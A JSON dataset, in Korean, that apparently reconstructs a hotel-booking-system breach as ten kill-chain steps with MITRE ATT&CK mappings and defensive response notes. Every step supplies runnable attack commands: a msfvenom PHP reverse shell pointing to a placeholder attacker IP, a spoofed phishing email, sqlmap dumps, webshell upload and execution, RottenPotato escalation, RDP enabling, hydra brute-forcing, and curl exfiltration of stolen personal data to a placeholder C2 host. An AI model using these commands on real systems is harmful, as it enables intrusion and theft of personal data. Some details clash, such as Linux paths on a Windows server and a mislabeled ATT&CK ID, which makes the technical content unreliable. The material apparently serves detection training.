[
  {
    "S_ID": "1",
    "Kill Chain Phase": "Reconnaissance",
    "Delivery Method": "N/A",
    "Target": "Network Router, PFSense VM, Internal Network",
    "Title": "내부 네트워크 정보 수집 및 취약점 분석",
    "Description": {
      "preconditions": "공격자는 외부 네트워크(192.168.73.x)에 위치하며, 대상 네트워크에 대한 사전 정보가 없는 상태.",
      "vantage_point": "Attacker Host",
      "technique": "Shodan 및 Nmap을 활용한 외부 네트워크 스캐닝. PFSense VM의 방화벽 설정 및 로드밸런스 구성 확인, Network Router의 VPN Access Point 존재 여부 파악. Windows 2008 서버의 포트 및 서비스 정보, WordPress/Joomla 버전 정보 수집.",
      "commands": [
        "nmap -sV -p 1-65535 192.168.73.x",
        "nmap -O -A 192.168.73.x"
      ],
      "protocol_ports": "TCP/443 (VPN), TCP/80 (HTTP), TCP/443 (HTTPS), TCP/3306 (MySQL), TCP/8080 (로드밸런서)",
      "artifacts": "N/A"
    },
    "MITRE ATT&CK": [
      {
        "id": "T1595.002",
        "reason": "자동화된 툴(Nmap, Shodan)을 사용하여 공개적으로 접근 가능한 인프라 정보를 수집하는 행위."
      },
      {
        "id": "T1592.002",
        "reason": "DNS, VPN 등 네트워크 서비스의 구성 정보를 수집하는 행위."
      }
    ],
    "Expected Actions": "네트워크 접근 제어 목록(ACL) 검토, 방화벽 로그 분석, 비정상적인 포트 스캐닝 탐지 및 차단.",
    "evidence": {
      "type": "inferred",
      "reason": "보고서에는 직접적인 정찰 행위가 언급되지 않았으나, APT 공격의 필수적인 선행 단계이며 PFSense와 Network Router를 분석하여 잠재적 진입점을 파악했을 것으로 추론."
    }
  },
  {
    "S_ID": "2",
    "Kill Chain Phase": "Weaponization & Delivery",
    "Delivery Method": "Email",
    "Target": "Server 1 or Server 2 (WordPress), 또는 가상의 '직원 A' PC",
    "Title": "워드프레스 취약점 악용을 위한 악성 이메일 발송",
    "Description": {
      "preconditions": "공격자는 대상 서버의 워드프레스(WordPress) 버전 취약점을 파악한 상태.",
      "vantage_point": "Attacker Host",
      "technique": "사회공학 기법을 이용하여 지인을 사칭하고, 워드프레스 플러그인 취약점(예: WP-Mail SMTP)을 악용할 수 있는 악성코드가 첨부된 이메일을 발송. 첨부 파일은 ZIP 형태로 압축된 PHP 웹쉘.",
      "commands": [
        "msfvenom -p php/meterpreter/reverse_tcp LHOST={{ATTACKER_IP}} LPORT=4444 -f raw > shell.php",
        "zip -r malicious_file.zip shell.php",
        "smtp-cli --host={{SMTP_SERVER}} --user={{ATTACKER_EMAIL}} --pass={{ATTACKER_PASS}} --from={{SPOOFED_EMAIL}} --to={{TARGET_EMAIL}} --subject='중요한 업무 관련 자료입니다' --attach=malicious_file.zip"
      ],
      "protocol_ports": "TCP/25, TCP/587 (SMTP)",
      "artifacts": "malicious_file.zip"
    },
    "MITRE ATT&CK": [
      {
        "id": "T1566.001",
        "reason": "악성코드가 포함된 이메일을 발송하여 사용자(직원 A)가 첨부 파일을 열도록 유도하는 사회공학적 기법."
      },
      {
        "id": "T1204.002",
        "reason": "피싱 이메일 내 첨부 파일을 열람하도록 유도하는 사용자 실행 단계."
      }
    ],
    "Expected Actions": "이메일 필터링 및 샌드박스 탐지, 첨부 파일 실행 차단, 사용자 대상 피싱 방지 교육.",
    "evidence": {
      "type": "observed",
      "reason": "보고서에서 '해커가 지인을 사칭해 악성코드가 첨부된 이메일 발송' 및 '직원 A가 해당 메일 열람 후, 악성코드 감염'으로 명시됨."
    }
  },
  {
    "S_ID": "3",
    "Kill Chain Phase": "Exploitation",
    "Delivery Method": "N/A",
    "Target": "server 1 (192.168.70.1)",
    "Title": "웹 취약점(SQL Injection)을 통한 정보 유출 및 웹쉘 업로드",
    "Description": {
      "preconditions": "공격자는 WordPress 블로그의 관리자 계정 정보를 탈취했거나, SQL Injection 취약점을 발견한 상태.",
      "vantage_point": "Attacker Host",
      "technique": "WordPress의 취약한 로그인 페이지나 플러그인 입력 폼을 통해 SQL Injection을 시도. `UNION SELECT` 구문을 사용하여 MySQL 데이터베이스의 사용자 계정 정보(ID, 비밀번호)를 덤프. 이후, 탈취한 관리자 계정으로 로그인하여 취약한 파일 업로드 기능을 통해 웹쉘(webshell.php)을 업로드.",
      "commands": [
        "sqlmap -u \"http://192.168.70.1/wp-login.php\" --dbs",
        "sqlmap -u \"http://192.168.70.1/wp-login.php\" -D wordpress_db --tables",
        "sqlmap -u \"http://192.168.70.1/wp-login.php\" -T wp_users --dump",
        "curl -X POST -F 'file=@webshell.php' 'http://192.168.70.1/wp-content/themes/vulnerable_theme/upload.php'"
      ],
      "protocol_ports": "HTTP/80",
      "artifacts": "/var/www/html/wp-content/uploads/webshell.php"
    },
    "MITRE ATT&CK": [
      {
        "id": "T1190",
        "reason": "인터넷에 노출된 웹 애플리케이션(WordPress)의 취약점을 악용하여 초기 접근을 획득하는 행위."
      },
      {
        "id": "T1505.003",
        "reason": "웹 애플리케이션의 취약점을 이용해 지속적인 접근을 위한 웹쉘을 설치하는 행위."
      }
    ],
    "Expected Actions": "웹 애플리케이션 방화벽(WAF) 로그 모니터링, SQL Injection 시도 탐지, 파일 업로드 취약점 패치.",
    "evidence": {
      "type": "partial_observed",
      "reason": "보고서에 '악성코드 감염' 이후 '파일 공유 서버 접속'이 언급되지만, 웹 서버(WordPress)에 대한 초기 접근 방식이 명확하지 않음. 취약한 웹 플랫폼 호스팅 자산을 고려할 때, 웹 취약점 악용(SQLi) 후 웹쉘 설치를 통해 내부 접근을 시도했을 것으로 추론."
    }
  },
  {
    "S_ID": "4",
    "Kill Chain Phase": "Installation & Persistence",
    "Delivery Method": "N/A",
    "Target": "server 1 (192.168.70.1)",
    "Title": "웹쉘을 이용한 지속적인 접근 및 권한 상승",
    "Description": {
      "preconditions": "공격자는 server 1에 웹쉘을 성공적으로 업로드한 상태.",
      "vantage_point": "server 1 (내부망)",
      "technique": "웹쉘을 통해 웹 서버에 접속하고, 시스템 명령어를 실행하여 권한을 상승시킨다. `whoami` 명령어로 현재 권한을 확인하고, `find` 명령어로 '비밀번호 관리대장'과 같은 중요 파일을 탐색한다. 이 과정에서 `Windows 2008`의 알려진 권한 상승 취약점(예: RottenPotato)을 악용하여 SYSTEM 권한을 획득한다.",
      "commands": [
        "curl http://192.168.70.1/wp-content/uploads/webshell.php?cmd=whoami",
        "curl http://192.168.70.1/wp-content/uploads/webshell.php?cmd=\"powershell -command 'C:\\temp\\RottenPotato.exe'\"",
        "curl http://192.168.70.1/wp-content/uploads/webshell.php?cmd=\"find . -name '*password*'\""
      ],
      "protocol_ports": "HTTP/80",
      "artifacts": "/var/www/html/wp-content/uploads/webshell.php"
    },
    "MITRE ATT&CK": [
      {
        "id": "T1059.003",
        "reason": "웹쉘을 통해 웹 서버에서 PowerShell 명령어를 실행하여 권한 상승을 시도."
      },
      {
        "id": "T1068",
        "reason": "운영 체제(Windows 2008)의 취약점을 악용하여 권한을 상승시키는 행위."
      },
      {
        "id": "T1083",
        "reason": "파일 시스템을 탐색하여 민감 정보가 포함된 파일을 찾는 행위."
      }
    ],
    "Expected Actions": "웹 서버의 시스템 명령어 실행 로그 모니터링, 파일 시스템 무결성 검사, 권한 상승 시도 탐지.",
    "evidence": {
      "type": "partial_observed",
      "reason": "보고서에 '직원 A PC 경유', '공용계정', '패스워드 관리대장' 등 내부 네트워크 접근 및 권한 획득에 대한 간접적 증거가 존재하나, 구체적 행위는 불분명함. 웹쉘 설치 후 내부 서버 탐색 및 권한 상승을 시도했을 것으로 추론."
    }
  },
  {
    "S_ID": "5",
    "Kill Chain Phase": "Command and Control",
    "Delivery Method": "N/A",
    "Target": "server 1 (192.168.70.1)",
    "Title": "원격 접속을 위한 VPN 설정 조작",
    "Description": {
      "preconditions": "공격자는 server 1에 대한 관리자 권한을 획득한 상태.",
      "vantage_point": "server 1 (내부망)",
      "technique": "서버 1에서 원격 접속(RDP) 설정을 변경하여 원격 데스크톱 연결을 허용한다. 추가적으로, VPN 접근 포트와 내부 로드 밸런싱(PFSense VM) 설정을 조작하여 외부에서 내부망으로의 지속적인 접근 채널을 확보한다. 이 과정에서 VPN 연결 상태를 이용하여 C2 채널을 유지한다.",
      "commands": [
        "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
        "netsh advfirewall firewall set rule group=\"Remote Desktop\" new enable=yes",
        "powershell -command \"Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\TSAppSrv\\fSingleSessionPerUser' -Name fSingleSessionPerUser -Value 0\""
      ],
      "protocol_ports": "TCP/3389 (RDP)",
      "artifacts": "Windows Registry 수정, 방화벽 규칙 변경"
    },
    "MITRE ATT&CK": [
      {
        "id": "T1021.001",
        "reason": "원격 데스크톱 프로토콜(RDP) 설정을 조작하여 원격 접근을 허용."
      },
      {
        "id": "T1562.004",
        "reason": "방화벽 규칙을 수정하여 지속적인 C2 통신을 위한 포트를 열어두는 행위."
      }
    ],
    "Expected Actions": "RDP 서비스 설정 변경 로그 모니터링, 방화벽 규칙 변경 알림, 비정상적인 원격 접속 시도 탐지.",
    "evidence": {
      "type": "observed",
      "reason": "보고서에서 '원격데스크톱 방식의 공유 설정을 허용해놓음'으로 명시됨. 이는 공격자가 원격 접속을 위한 설정을 변경했거나 이미 설정되어 있음을 의미."
    }
  },
  {
    "S_ID": "6",
    "Kill Chain Phase": "Lateral Movement",
    "Delivery Method": "N/A",
    "Target": "server 2 (192.168.70.2)",
    "Title": "내부 서버(server 2)에 대한 패스워드 대입 공격 (브루트포스)",
    "Description": {
      "preconditions": "공격자는 server 1에 대한 권한을 획득하고, server 2의 서비스 포트 및 계정 목록을 파악한 상태. 이 계정 목록에는 공용 계정 등 취약한 계정이 포함되어 있다.",
      "vantage_point": "server 1 (192.168.70.1)",
      "technique": "server 1을 경유하여 내부망에 위치한 server 2의 MySQL 및 RDP 서비스에 대해 무차별 대입 공격(브루트포스)을 시도한다. 공용 계정의 ID/비밀번호가 동일하게 설정되어 있다는 취약점을 악용하여 성공적인 로그인을 시도한다. 이 행위는 보고서에 명시된 '패스워드 대입공격 수행'을 직접적으로 반영한다.",
      "commands": [
        "hydra -L /path/to/usernames.txt -P /path/to/passwords.txt 192.168.70.2 mysql",
        "hydra -L /path/to/usernames.txt -P /path/to/passwords.txt rdp://192.168.70.2"
      ],
      "protocol_ports": "TCP/3306 (MySQL), TCP/3389 (RDP)",
      "artifacts": "N/A"
    },
    "MITRE ATT&CK": [
      {
        "id": "T1110.001",
        "reason": "합법적인 계정(valid account)에 대한 무차별 대입 공격(password guessing)을 수행하는 행위."
      },
      {
        "id": "T1078",
        "reason": "탈취한 유효한 계정(valid accounts)을 사용하여 다른 시스템에 접근."
      }
    ],
    "Expected Actions": "내부 네트워크의 로그인 시도 로그 모니터링, 비정상적인 로그인 실패 횟수 탐지, 계정 잠금 정책 적용.",
    "evidence": {
      "type": "observed",
      "reason": "보고서에서 '파일공유서버를 통해 패스워드 대입공격 수행 (브루트포스)'로 명시됨. 자산 정보에 파일 공유 서버는 없으므로 기능적 유사성이 있는 서버 1(경유지)을 통해 공격이 수행된 것으로 재구성."
    }
  },
  {
    "S_ID": "7",
    "Kill Chain Phase": "Lateral Movement",
    "Delivery Method": "N/A",
    "Target": "server 3 (192.168.71.1)",
    "Title": "가상화 환경(망분리 실패)을 이용한 Hotel Booking System 서버 침투",
    "Description": {
      "preconditions": "공격자는 server 2에 대한 권한을 확보하고, PFSense VM의 라우팅 설정 변경 등 내부 네트워크 정보를 파악한 상태.",
      "vantage_point": "server 2 (192.168.70.2)",
      "technique": "서버 2를 경유하여 PFSense VM의 내부 네트워크 설정(192.168.70.x -> 192.168.71.x)을 분석. 망분리 실패로 인해 가상화 환경에서 내부 통신이 가능한 점을 악용하여, Joomia CMS가 호스팅된 server 3(192.168.71.1)에 접근한다. Joomia의 취약점(예: CVE-2015-8562)을 스캔하고, SQLi 공격을 통해 DB 서버에 접근 가능한 정보를 탈취한다.",
      "commands": [
        "nmap -sV -p 80,3306 192.168.71.1",
        "sqlmap -u \"http://192.168.71.1/index.php?option=com_content&view=article&id=1\" --dbs",
        "sqlmap -u \"http://192.168.71.1/index.php?option=com_content&view=article&id=1\" -D joomia_db --dump-all"
      ],
      "protocol_ports": "HTTP/80, MySQL/3306",
      "artifacts": "N/A"
    },
    "MITRE ATT&CK": [
      {
        "id": "T1210",
        "reason": "내부 네트워크의 방화벽 또는 라우팅 설정 취약점을 악용하여 다른 네트워크 세그먼트로 이동."
      },
      {
        "id": "T1562.004",
        "reason": "방화벽 정책을 우회하여 내부 네트워크에 접근하는 행위."
      },
      {
        "id": "T1190",
        "reason": "Joomia CMS의 취약점을 악용하여 정보 탈취 및 접근 권한 확보."
      }
    ],
    "Expected Actions": "네트워크 세그먼트 간의 비정상적인 트래픽 탐지, 라우팅 테이블 변경 로그 모니터링, Joomia 서버의 패치 상태 확인.",
    "evidence": {
      "type": "partial_observed",
      "reason": "보고서에 '망분리 실패: 보안성이 떨어지는 가상화 방식 적용하여 운영'으로 명시되어, 내부망 간 횡적 이동이 용이했음을 추론."
    }
  },
  {
    "S_ID": "8",
    "Kill Chain Phase": "Actions on Objectives",
    "Delivery Method": "N/A",
    "Target": "MySQL DB on server 1, 2, 3",
    "Title": "데이터베이스(MySQL)에서 개인정보 탈취",
    "Description": {
      "preconditions": "공격자는 server 1, 2, 3의 MySQL 데이터베이스 접속 정보를 확보한 상태.",
      "vantage_point": "server 1, 2, 3",
      "technique": "탈취한 DB 계정을 사용하여 MySQL 데이터베이스에 직접 접속한다. `SELECT` 쿼리를 실행하여 `user_info` 테이블에서 회원 정보를 추출한다. 이 정보에는 이름, 전화번호, 이메일, 주소 등 개인 식별 정보(PII)가 포함된다.",
      "commands": [
        "mysql -u root -p'password' -h localhost -e 'USE wordpress_db; SELECT * FROM wp_users INTO OUTFILE '/tmp/users.csv';'",
        "mysql -u root -p'password' -h 192.168.71.1 -e 'USE joomia_db; SELECT * FROM user_info INTO OUTFILE '/tmp/hotel_users.csv';'"
      ],
      "protocol_ports": "MySQL/3306",
      "artifacts": "/tmp/users.csv, /tmp/hotel_users.csv"
    },
    "MITRE ATT&CK": [
      {
        "id": "T1537",
        "reason": "데이터베이스로부터 민감 정보를 직접 추출하는 행위."
      },
      {
        "id": "T1560.001",
        "reason": "대량의 데이터를 압축하거나 아카이빙하여 유출 준비를 하는 행위."
      }
    ],
    "Expected Actions": "데이터베이스 접근 로그 분석, 비정상적인 대량의 데이터 쿼리 탐지, 데이터베이스 접근 통제 정책 강화.",
    "evidence": {
      "type": "observed",
      "reason": "보고서에서 'DB서버의 개인정보 탈취', '회원정보 26,658,753건'으로 명시되어 직접적인 탈취 행위가 있었음을 확인."
    }
  },
  {
    "S_ID": "9",
    "Kill Chain Phase": "Actions on Objectives",
    "Delivery Method": "N/A",
    "Target": "server 1, 2, 3",
    "Title": "탈취한 개인정보를 16개 파일로 분할 및 압축",
    "Description": {
      "preconditions": "공격자는 서버 내부에 탈취한 개인정보 파일(users.csv, hotel_users.csv 등)을 확보한 상태.",
      "vantage_point": "server 1, 2, 3",
      "technique": "대용량의 개인정보 파일을 16개로 분할하고, 압축하여 외부 유출을 용이하게 만든다. 이 과정은 데이터 유출 과정의 효율성을 높이기 위한 단계이다.",
      "commands": [
        "split -b 100M users.csv users_part",
        "zip -r leaked_data_part1.zip users_partaa",
        "zip -r leaked_data_part2.zip users_partab",
        "... (총 16개의 파일로 분할 및 압축)"
      ],
      "protocol_ports": "N/A",
      "artifacts": "leaked_data_part1.zip, ..., leaked_data_part16.zip"
    },
    "MITRE ATT&CK": [
      {
        "id": "T1560.001",
        "reason": "대량의 민감 데이터를 압축하여 유출을 준비하는 행위."
      }
    ],
    "Expected Actions": "서버 내에서 대용량 파일 생성 및 압축 행위 탐지, 비정상적인 파일 분할 명령어 사용 확인.",
    "evidence": {
      "type": "observed",
      "reason": "보고서에서 '16개 파일로 분할후' 외부 유출되었다고 명시."
    }
  },
  {
    "S_ID": "10",
    "Kill Chain Phase": "Actions on Objectives",
    "Delivery Method": "N/A",
    "Target": "Network Router, PFSense VM",
    "Title": "탈취 데이터 외부 유출 (Exfiltration)",
    "Description": {
      "preconditions": "공격자는 16개의 압축된 유출 파일을 확보한 상태.",
      "vantage_point": "server 1, 2, 3",
      "technique": "PFSense VM 방화벽 및 로드밸런스 설정에 대한 사전 분석을 통해 허용된 포트(예: 443, 80)를 이용한다. HTTPS를 가장한 터널링을 통해 외부 C2 서버로 분할된 데이터를 전송한다. 이 과정에서 VPN Access Point가 이미 구성되어 있어 이를 통해 안전한 데이터 유출 경로를 확보한다. 또한, 비정상적인 데이터 전송이 발생했을 때 장시간 접속 제한 조치가 이루어지지 않아 공격자의 장시간 접속이 유지된다.",
      "commands": [
        "curl -X POST -H 'Content-Type: application/zip' --data-binary '@leaked_data_part1.zip' 'https://{{ATTACKER_C2}}/upload'",
        "curl -X POST -H 'Content-Type: application/zip' --data-binary '@leaked_data_part2.zip' 'https://{{ATTACKER_C2}}/upload'",
        ".... (총 16개의 파일 전송)"
      ],
      "protocol_ports": "HTTPS/443 (HTTP 터널링)",
      "artifacts": "N/A"
    },
    "MITRE ATT&CK": [
      {
        "id": "T1041",
        "reason": "내부 시스템에서 외부로 데이터를 전송하는 행위."
      },
      {
        "id": "T1572",
        "reason": "터널링 프로토콜(HTTPS)을 사용하여 데이터를 유출하는 행위."
      }
    ],
    "Expected Actions": "방화벽/IDS/IPS 로그 분석, 비정상적인 대용량 파일 전송 탐지, 데이터 유출 방지(DLP) 시스템 경보.",
    "evidence": {
      "type": "observed",
      "reason": "보고서에서 '외부 유출'되었고 '해당 pc가 켜진 상태로 방치되어 최대 접속시간 제한 조치가 이루어지지 않아 공격자의 장시간 접속이 유지됨'으로 명시."
    }
  }
]
